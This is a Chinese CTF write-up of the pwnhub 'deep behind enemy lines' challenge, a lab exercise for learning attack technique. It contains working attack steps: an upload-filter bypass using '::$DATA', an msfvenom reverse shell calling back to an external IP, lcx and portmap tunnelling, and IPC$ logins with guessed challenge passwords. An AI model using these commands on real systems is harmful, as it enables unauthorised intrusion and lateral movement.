---
title: pwnhub 深入敌后
date: 2017-01-17 22:44:44
tags:
- pwnhub
- LFI
- win server信息收集
- msf
- lcx端口转发
- IPC通道入侵
categories:
- Blogs
---

从第一天晚上开始零零散散到17号晚，差不多做了几十个小时...由于实在没日过windows服务器，整个过程遇到各种没玩过的东西...稍微整理下writeup

<!--more-->

为了能让看的人理解，下面的wp我保留了大部分思考过程

# getshell #

```
详情

http://54.223.229.139/
 
 禁止转发入口ip机器的rdp服务端口，禁止修改任何服务器密码，禁止修改删除服务器文件。
 禁止对内网进行拓扑发现扫描，必要信息全部可以在服务器中获得。
 文明比赛，和谐共处。
更新

2017.01.15 11:50:00administrator：啊，好烦啊，需要设置那么多密码，偷懒好了，妈蛋，windows为啥还有密码策略。
2017.01.15 00:50:00因为一些未知问题，服务器桌面上新放了一个文件，可能就是你要找的。
2017.01.14 09:45:00入口服务器的用户名是瞎写的，不要在意（还有禁止对内网进行拓扑发现扫描，必要信息全部可以在服务器中获得

```
## 扫目录找到站并获得源码 ##


mmp，我的扫描器居然连这个都扫不到，最后这里使用了猪猪侠的扫描器才扫到的...

```
http://54.223.229.139/file/.hg/
```

.hg源码泄露可能知道的人不太多，但是国外的一个大佬写了全套的工具，好用的一比

[https://github.com/kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)

## 分析源码getshell ##

拿到源码，分析逻辑主要是这部分
```
	if(isset($_POST['submit'])){
		$filename =md5(uniqid(rand()));
		$filename = preg_replace("/[^\w]/i", "", $filename);
		$upfile = $_FILES['file']['name'];
		$upfile = str_replace(';',"",$upfile);
		$tempfile = $_FILES['file']['tmp_name'];
		$ext = trim(get_extension($upfile)); // null
		if(in_array($ext,array('php','php3','php5','php7','phtml'))){
			die('Warning ! File type error..');
		}
		if($ext == 'asp' or $ext == 'asa' or $ext == 'cer' or $ext == 'cdx' or $ext == 'aspx' or $ext == 'htaccess') $ext = 'file';

		$full_path = sprintf("./users_file_system/%s/%s.%s", $username, $filename,$ext);

	}


	
	if (move_uploaded_file($_FILES['file']['tmp_name'], $full_path) ){
		header("Location: files.php");
		exit;
	} else {
		header("Location: upload_failure.php");
		

		exit;
	}
 	function get_extension($file){
		return strtolower(substr($file, strrpos($file, '.')+1));
	}
```

这样的过滤看上去很严格，但是在win+php+iis的情况下，可以绕过

```
sss.php::$DATA
```

这样会发生截断，那么久绕过判断了

![image_1b6eu5f6bk4o3l9jsl1g991tsp9.png-141.5kB][1]

![image_1b6eu5u3ifqo1ajt77k1fdci4rm.png-25.8kB][2]

拿下shell找到入口

# windows信息收集攻击 #

## windows信息收集 ##

这里看了lemon师傅的wp，感觉66666，这里是因为提示跳步了，看lemon找ie的密码好6....

开始瞎翻，提示说桌面有东西，翻到桌面，有个东西看上去有用
```
ie-password.txt

==================================================
Entry Name        : https://www.baidu.com/
Type              : AutoComplete
Stored In         : Registry
User Name         : iamroot
Password          : abc@elk
Password Strength : Medium
==================================================


```

开始找东西

找到安装了xshell，有个内网地址，鬼知道是个啥

.......中间省略翻了一夜的文件...

实话说，没有目标的找东西好蛋疼...

## windows服务器入侵 ##

根据找到的一部分感觉有关系的文件搜索发现，妈卖批，webshell不够用，所以紧急学了一波msf

```
msfvenom -p windows/shell_reverse_tcp LHOST=115.28.78.16  LPORT=32452 -f exe -o /tmp/ddog2.exe
```

上传运行，然后监听

![image_1b6l5grlb13m1n5s1tf9804m1t13.png-6.1kB][3]

ipconfig

![image_1b6l64uhs1pu61fk35odp3h1uvh1g.png-34.4kB][4]

Net Localgroup

![image_1b6l7encusqp42g1mh2bltgmh1t.png-37.8kB][5]

加用户到admin权限组

![image_1b6l7j4l81eved3u1q5mbppq052a.png-39.5kB][6]

我记得上面提到过xshell里找到一个ip是172.31.5.95

用从别人那里抢来的大马扫端口，发现22是开着的，但是有了新的问题，在没有图形界面的情况下，怎么链接呢

目测内网渗透，要端口转发一波
主要是这篇文章
[http://www.vuln.cn/2791](http://www.vuln.cn/2791)


```
996fbc973641eac5b8df26e30b5640a9.exe -slave 115.28.78.16 6666 0.0.0.0 3389
```
![image_1b6lfnmphdos1buvbvg447ro32n.png-18.3kB][7]

```
./portmap -m 2 -p1 6666 -h2 115.28.78.16 -p2 7777
```

服务器转发出来
![image_1b6lfon6c196us04k2r1i2g1v0l34.png-11.3kB][8]

终于搞定了

在当时找文件的时候，我发现xshell里有个ip

![image_1b6lgdu5fmarovecb41van1a0g3h.png-196.7kB][9]

密码是刚才的hint

```
==================================================
Entry Name        : https://www.baidu.com/
Type              : AutoComplete
Stored In         : Registry
User Name         : iamroot
Password          : abc@elk
Password Strength : Medium
==================================================

```

登陆上去mmp...flag是假的，还要继续找

# linux入侵 #

看看.bash_history有个提到很多次的ip是172.31.13.133

这里应该也是省略了步骤，bash_history里面应该是小m留下的，最开始应该是没有的，这里从arp表里也能看到这个ip


发现有python3，扫一波端口

```
#!/usr/bin/python3
# -*- coding: utf-8 -*-
from socket import *

def portScanner(host,port):
    try:
        s = socket(AF_INET,SOCK_STREAM)
        s.connect((host,port))
        print('[+] %d open' % port)
        s.close()
    except:
        print('[-] %d close' % port)

def main():
    setdefaulttimeout(1)
    for p in range(1,1024):
        portScanner('192.168.0.100',p)

if __name__ == '__main__':
    main()
```

端口
```
ubuntu@ip-172-31-5-95:/tmp$ python3 dd.py 
[+] 135 open
[+] 139 open
[+] 445 open
[+] 5985 open
[+] 33389 open
[+] 47001 open
[+] 49152 open
[+] 49153 open
[+] 49154 open
[+] 49169 open
[+] 49170 open
[+] 49177 open
```

在5985上和47001上不知道开了个什么，好像是个管理工具，而后面的大端口也不知道是干嘛的，后面nmap也没扫到...

后来发现win服务器也能访问，气的我下了个nmap

```
PORT      STATE SERVICE      VERSION

135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC

Uptime guess: 36.267 days (since Mon Dec 12 02:45:16 2016)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows


Host script results:
|_clock-skew: mean: -2m42s, deviation: 0s, median: -2m42s
| nbstat: NetBIOS name: WIN-HVA1K03ESA1, NetBIOS user: <unknown>, NetBIOS MAC: 06:03:2f:2f:98:ea (unknown)
| Names:
|   WIN-HVA1K03ESA1<00>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WIN-HVA1K03ESA1<20>  Flags: <unique><active>
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: WIN-HVA1K03ESA1
|   NetBIOS computer name: WIN-HVA1K03ESA1\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2017-01-17T09:06:29+00:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.00 ms ip-172-31-13-133.cn-north-1.compute.internal (172.31.13.133)
```

![image_1b6lr2rq41f1f9l7140f13bd82h3u.png-3.3kB][10]

围绕着几个端口开始找漏洞，135和445猜测是ms08-067漏洞

测试一发发现被防火墙挡了，然后经过漫长的寻找发现有个漏洞叫**139 IPC通道入侵**

百度一发文章非常多，主要是需要连接服务器
```
net use \\172.31.13.133\ipc$ "abc@elk" /user:"Administrator"
```

本以为是弱口令，所以就直接试了这个密码，但是苦试无果，突然想到hint3之前只用上了一次

```
2017.01.15 11:50:00administrator：啊，好烦啊，需要设置那么多密码，偷懒好了，妈蛋，windows为啥还有密码策略。
```

让我们来看看服务器上的密码策略
```
長度至少為 6 個字元
包含下列四種字元中的三種:
英文大寫字元 (A 到 Z)
英文小寫字元 (a 到 z)
10 進位數字 (0 到 9)
非英文字母字元 (例如: !、$、#、%)
建立或變更密碼時會強制執行複雜性需求。
```

猜测是不想改密码，但是不符合密码要求，所以修改了其中部分...目测是弱口令，这一试就是一小时...

最后居然被我试出来了
```
net use \\172.31.13.133\ipc$ "abc@ELK" /user:"Administrator"
```

然后映射盘
```
net use d: \\172.31.13.133\c$ "abc@ELK" /user:"Administrator"
```

把服务器上映射到了d盘，结果没有flag！！！！

找了20多分钟被迫问了v师傅，告诉我就在这台上，全局搜索flag，get




  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/pf1t32io7xaoujii6f9rrrcq/image_1b6eu5f6bk4o3l9jsl1g991tsp9.png
  [2]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/zwrf4r3h19lpbvxfy9gqqb17/image_1b6eu5u3ifqo1ajt77k1fdci4rm.png
  [3]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/pccg6rlisy1ghel0n4s4ijig/image_1b6l5grlb13m1n5s1tf9804m1t13.png
  [4]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/wk776ofeeq3lj0ws0zsxsi0r/image_1b6l64uhs1pu61fk35odp3h1uvh1g.png
  [5]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/jyn5s78owlpauf91e9ebusza/image_1b6l7encusqp42g1mh2bltgmh1t.png
  [6]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/oii146dyawdch04zh6tlocc8/image_1b6l7j4l81eved3u1q5mbppq052a.png
  [7]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/dsayrn7zx9whlhacoe8ngirr/image_1b6lfnmphdos1buvbvg447ro32n.png
  [8]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/venhfwmygje88z05ve8org85/image_1b6lfon6c196us04k2r1i2g1v0l34.png
  [9]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/vkafi9ufrmgjbywat28vnyxb/image_1b6lgdu5fmarovecb41van1a0g3h.png
  [10]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/mrstoosa1un6h4e12nw2umz8/image_1b6lr2rq41f1f9l7140f13bd82h3u.png